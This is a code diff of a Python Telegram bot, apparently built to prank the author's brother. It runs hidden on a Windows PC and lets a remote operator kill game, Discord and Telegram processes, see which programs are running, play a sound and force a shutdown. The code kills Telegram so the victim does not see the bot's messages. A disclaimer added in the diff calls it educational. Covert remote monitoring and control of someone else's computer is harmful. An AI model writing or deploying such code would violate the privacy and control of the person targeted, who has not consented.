@@ -2,7 +2,15 @@
 # This code is ugly. It just had to work. You can make it better.
 # I made this telegram bot to prank my brother (https://www.youtube.com/watch?v=BOkSupPtWCQ)
 # I changed some parts to ********************** for privacy reasons
-# If you know a bit of coding you will realize it's an extremely easy program. If you don't know coding learn it and then come back.
+# If you know a bit of coding you will realize it's an extremely easy program. If you don't know coding learn it
+# and then come back.
+# --------------------------------------------------------------------------------------------------------------------
+# !!! THIS IS A MESSAGE FROM THE CREATOR OF THE REPOSITORY (me, iThinkAle): THIS PROGRAM IS NOT MADE BY ME.
+# THIS PROGRAM IS MADE BY DAVID ALESSANDRINI, THE GUY THAT PRANKED HIS BROTHER IN THE VIDEO LINKED ABOVE.
+# THE GUYS IN THE VIDEO LINKED ABOVE ARE NOT RELATED TO ME IN ANY WAY.
+# THIS PROGRAM IS LINKED IN THE VIDEO COMMENT SECTION.
+# THIS PROGRAM IS NOT MINE AND IS INTENDET FOR EDUCATIONAL AND ENTERTAINMENT PURPOSES ONLY.
+# DO NOT USE THIS PROGRAM WITH BAD INTENTIONS.
 
 
 
@@ -16,25 +24,25 @@ import socket
 from telepot.loop import MessageLoop
 from telepot.namedtuple import ReplyKeyboardMarkup
 
-def greenSquare():
+def greensquare():
     return u'\U00002705'
-def redSquare():
+def redsquare():
     return u'\U0000274C'
-def playGlitch():
+def playglitch():
     mixer.init()
     mixer.music.load('C:\dev\watchdog\sound.mp3')
     mixer.music.play()
-def davidId():
+def davidid():
     return **********************
-def davidUsername():
+def davidusername():
     return "**********************"
-def botToken():
+def bottoken():
     return "**********************"
 
-def notifyTelegramPoint():
-    bot.sendMessage(davidId(), '.')
+def notifytelegrampoint():
+    bot.sendMessage(davidid(), '.')
 
-def waitForInternetConnection():
+def waitforinternetconnection():
     try:
         host = socket.gethostbyname("www.google.com")
         s = socket.create_connection((host, 80), 2)
@@ -43,7 +51,7 @@ def waitForInternetConnection():
         pass
     return False
 
-def checkIfProcessRunning(processName):
+def checkifprocessrunning(processname):
     '''
     Check if there is any running process that contains the given name processName.
     '''
@@ -51,125 +59,125 @@ def checkIfProcessRunning(processName):
     for proc in psutil.process_iter():
         try:
             # Check if process name contains the given name string.
-            if processName.lower() in proc.name().lower():
+            if processname.lower() in proc.name().lower():
                 return True
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass
     return False
 
-def killFortnite(): #kill fortnite process
-    if fortniteRunning():
+def killfortnite(): #kill fortnite process
+    if fortniterunning():
         os.system("taskkill /f /im FortniteClient-Win64-Shipping.exe")
 
-def fortniteRunning():
-    return checkIfProcessRunning("FortniteClient-Win64-Shipping.exe")
+def fortniterunning():
+    return checkifprocessrunning("FortniteClient-Win64-Shipping.exe")
 
-def killFortniteLauncher(): #kill fortnite launcher process
-    if fortniteLauncherRunning():
+def killfortnitelauncher(): #kill fortnite launcher process
+    if fortnitelauncherrunning():
         os.system("taskkill /f /im EpicGamesLauncher.exe")
 
-def fortniteLauncherRunning():
-    return checkIfProcessRunning("EpicGamesLauncher.exe")
+def fortnitelauncherrunning():
+    return checkifprocessrunning("EpicGamesLauncher.exe")
 
-def killTelegram():
-    if telegramRunning():
+def killtelegram():
+    if telegramrunning():
         os.system("taskkill /f /im Telegram.exe")
 
-def telegramRunning():
-    return checkIfProcessRunning("Telegram.exe")
+def telegramrunning():
+    return checkifprocessrunning("Telegram.exe")
 
-def killDiscord():
-    if discordRunning():
+def killdiscord():
+    if discordrunning():
         os.system("taskkill /f /im Discord.exe")
 
-def discordRunning():
-    return checkIfProcessRunning("Discord.exe")
+def discordrunning():
+    return checkifprocessrunning("Discord.exe")
 
-def apexRunning():
-    return checkIfProcessRunning("r5apex.exe")
+def apexrunning():
+    return checkifprocessrunning("r5apex.exe")
 
-def killApex():
-    if apexRunning():
+def killapex():
+    if apexrunning():
         os.system("taskkill /f /im r5apex.exe")
 
-def killAll():
-    killFortniteLauncher()
-    killFortnite()
-    killTelegram()
-    killDiscord()
-    killApex()
+def killall():
+    killfortnitelauncher()
+    killfortnite()
+    killtelegram()
+    killdiscord()
+    killapex()
 
 
-def updateUser():
-    killTelegram() #prevent user seeing message on desktop
+def updateuser():
+    killtelegram() #prevent user seeing message on desktop
 
-    if fortniteLauncherRunning():
-        bot.sendMessage(davidId(), "FL" + greenSquare())
+    if fortnitelauncherrunning():
+        bot.sendMessage(davidid(), "FL" + greensquare())
     else:
-        bot.sendMessage(davidId(), "FL" + redSquare())
+        bot.sendMessage(davidid(), "FL" + redsquare())
 
-    if fortniteRunning():
-        bot.sendMessage(davidId(), "F" + greenSquare())
+    if fortniterunning():
+        bot.sendMessage(davidid(), "F" + greensquare())
     else:
-        bot.sendMessage(davidId(), "F" + redSquare())
+        bot.sendMessage(davidid(), "F" + redsquare())
 
-    if discordRunning():
-        bot.sendMessage(davidId(), "D" + greenSquare())
+    if discordrunning():
+        bot.sendMessage(davidid(), "D" + greensquare())
     else:
-        bot.sendMessage(davidId(), "D" + redSquare())
+        bot.sendMessage(davidid(), "D" + redsquare())
 
-    if apexRunning():
-        bot.sendMessage(davidId(), "A" + greenSquare())
+    if apexrunning():
+        bot.sendMessage(davidid(), "A" + greensquare())
     else:
-        bot.sendMessage(davidId(), "A" + redSquare())
+        bot.sendMessage(davidid(), "A" + redsquare())
 
-def shutdownPc():
+def shutdownpc():
     os.system('shutdown -s -t 0')
 
 def handle(msg): #what to do if new message is received
-    contentType, chatType, chatId = telepot.glance(msg)
+    contenttype, chattype, chatid = telepot.glance(msg)
     text = msg['text'].upper()
-    if not (chatId == **********************):
-        bot.sendMessage(chatId, "WHO ARE YOU?! I WILL TELL MY MASTER")
-        bot.sendMessage(davidId(), 'Someone contacted me! Here is the information:\n' + msg)
+    if not (chatid == **********************):
+        bot.sendMessage(chatid, "WHO ARE YOU?! I WILL TELL MY MASTER")
+        bot.sendMessage(davidid(), 'Someone contacted me! Here is the information:\n' + msg)
     elif text == 'KILL' or text == 'KILLALL' or text == 'KILL ALL' or text == 'KA':
-        killAll()
-        notifyTelegramPoint()
+        killall()
+        notifytelegrampoint()
     elif text == 'KILL FORTNITE' or text == 'KF' or text == 'K':
-        killTelegram()
-        killFortnite()
-        killFortniteLauncher()
-        notifyTelegramPoint()
+        killtelegram()
+        killfortnite()
+        killfortnitelauncher()
+        notifytelegrampoint()
     elif text == 'UPDATE' or text == 'U':
-        updateUser()
+        updateuser()
     elif text == '/START':
-        bot.sendMessage(davidId(), "Welcome back Master", reply_markup=keyboard)
+        bot.sendMessage(davidid(), "Welcome back Master", reply_markup=keyboard)
     elif text == 'SHUTDOWN':
-        bot.sendMessage(davidId(), "Shutting down. Bye Bye")
-        shutdownPc()
+        bot.sendMessage(davidid(), "Shutting down. Bye Bye")
+        shutdownpc()
     elif text == 'KILL ALL WITH REACTION' or text == 'KAWR':
-        killAll()
-        notifyTelegramPoint()
-        bot.sendMessage(davidId(), "Reaction still not implemented")
+        killall()
+        notifytelegrampoint()
+        bot.sendMessage(davidid(), "Reaction still not implemented")
     elif text == 'KIM':
         time.sleep(60)
-        killAll()
-        notifyTelegramPoint()
+        killall()
+        notifytelegrampoint()
     elif text == 'KITENS':
         time.sleep(10)
-        killAll()
-        notifyTelegramPoint()
+        killall()
+        notifytelegrampoint()
     elif text == 'S':
-        playGlitch()
-        notifyTelegramPoint()
+        playglitch()
+        notifytelegrampoint()
     else:
-        bot.sendMessage(davidId(), "I don't understand...", reply_markup=keyboard)
+        bot.sendMessage(davidid(), "I don't understand...", reply_markup=keyboard)
 
 time.sleep(120)
-waitForInternetConnection()
-bot = telepot.Bot(botToken())
+waitforinternetconnection()
+bot = telepot.Bot(bottoken())
 MessageLoop(bot, handle).run_as_thread()
 keyboard = ReplyKeyboardMarkup(keyboard=[['KA', 'U'], ['KF', 'KAWR'], ['KIM', 'KITENS']])
-bot.sendMessage(davidId(), 'wO.Ow', reply_markup=keyboard)
+bot.sendMessage(davidid(), 'wO.Ow', reply_markup=keyboard)
 while 1:
     time.sleep(10)
